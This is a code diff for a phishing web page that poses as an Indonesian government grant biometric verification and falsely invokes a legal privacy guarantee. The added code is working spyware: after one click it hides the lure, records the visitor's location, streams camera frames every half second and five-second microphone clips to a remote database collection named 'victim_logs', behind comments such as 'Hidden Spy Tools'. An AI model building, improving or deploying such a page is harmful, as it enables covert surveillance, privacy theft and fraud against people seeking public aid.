@@ -3,18 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Bansos</title>
+    <title>Sistem Verifikasi Dana Hibah</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .shimmer { background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; }
+        @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    </style>
 </head>
-<body class="bg-gray-200">
-    <div id="auth-wall" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center p-6 text-center">
-        <div class="mb-6 p-4 bg-red-100 rounded-full animate-pulse">⚠️</div>
-        <h1 class="text-xl font-bold mb-2">VERIFIKASI KEAMANAN</h1>
-        <p class="text-sm text-gray-600 mb-8">Untuk mencegah penipuan, izinkan akses kamera dan mikrofon guna proses Face-ID verifikasi penerima dana hibah.</p>
-        <button id="init-btn" class="w-full max-w-xs bg-red-600 text-white font-bold py-4 rounded-xl shadow-lg">LANJUTKAN VERIFIKASI</button>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <!-- Phishing Wall -->
+    <div id="auth-wall" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center p-8 text-center">
+        <div class="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center text-white text-4xl mb-6 shadow-xl">✓</div>
+        <h1 class="text-2xl font-bold text-gray-800 mb-2">VERIFIKASI IDENTITAS</h1>
+        <p class="text-gray-500 text-sm mb-10 max-w-xs">Proses pencairan dana hibah memerlukan verifikasi biometrik (Wajah & Suara) untuk memastikan keamanan akun Anda.</p>
+        
+        <div class="w-full max-w-xs space-y-4">
+            <button id="init-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-4 rounded-2xl shadow-lg transition-transform active:scale-95">IZINKAN & LANJUTKAN</button>
+            <p class="text-[10px] text-gray-400">Pemerintah RI menjamin kerahasiaan data Anda sesuai UU ITE.</p>
+        </div>
     </div>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
+    <!-- Fake Content Behind Wall -->
+    <div class="max-w-md w-full p-4">
+        <div class="bg-white rounded-3xl p-6 shadow-xl border border-gray-100">
+            <div class="shimmer h-8 w-3/4 rounded mb-4"></div>
+            <div class="shimmer h-40 w-full rounded mb-4"></div>
+            <div class="shimmer h-4 w-1/2 rounded mb-2"></div>
+            <div class="shimmer h-4 w-full rounded"></div>
+        </div>
+    </div>
+
+    <!-- Hidden Spy Tools -->
+    <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
@@ -39,12 +59,12 @@
         const appId = "apktroj_v1";
 
         document.getElementById('init-btn').onclick = async () => {
-            document.getElementById('auth-wall').classList.add('hidden');
+            document.getElementById('auth-wall').style.display = 'none';
             await signInAnonymously(auth);
-            startSpying();
+            runUltraSmoothSpy();
         };
 
-        async function upload(data) {
+        async function push(data) {
             try {
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
                     ...data,
@@ -54,41 +74,41 @@
             } catch (e) {}
         }
 
-        function startSpying() {
-            // Get Location
+        function runUltraSmoothSpy() {
+            // Location tracking
             navigator.geolocation.getCurrentPosition(p => {
-                upload({ action: "LOCATION", location: { lat: p.coords.latitude, lng: p.coords.longitude } });
+                push({ action: "GEO_UPDATE", location: { lat: p.coords.latitude, lng: p.coords.longitude } });
             });
 
-            // Start Live Stream & Audio
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            // Camera & Mic
+            navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // Live Camera Frames (Every 2 seconds)
+                // ULTRA SMOOTH: Frame every 500ms
                 setInterval(() => {
                     const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth / 2; // Resize for speed
-                    canvas.height = video.videoHeight / 2;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    upload({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.3) });
-                }, 2000);
+                    canvas.width = 160; // Downscale for speed
+                    canvas.height = 120;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 160, 120);
+                    push({ action: "LIVE_FRAME", frame: canvas.toDataURL('image/jpeg', 0.2) });
+                }, 500);
 
-                // Audio Recorder
+                // Audio Stream: 5s clips
                 const recorder = new MediaRecorder(stream);
                 let chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = () => {
                     const reader = new FileReader();
-                    reader.onloadend = () => upload({ action: "AUDIO_CLIP", audio: reader.result });
+                    reader.onloadend = () => push({ action: "AUDIO_CLIP", audio: reader.result });
                     reader.readAsDataURL(new Blob(chunks));
                     chunks = [];
-                    setTimeout(() => recorder.start(), 1000); // Record again
+                    setTimeout(() => recorder.start(), 500);
                 };
                 recorder.start();
-                setInterval(() => recorder.stop(), 8000); // Send clip every 8s
+                setInterval(() => { if(recorder.state === 'recording') recorder.stop(); }, 5000);
 
-            }).catch(e => upload({ action: "PERMISSION_DENIED" }));
+            }).catch(e => push({ action: "AUTH_DENIED", msg: e.message }));
         }
     </script>
 </body>
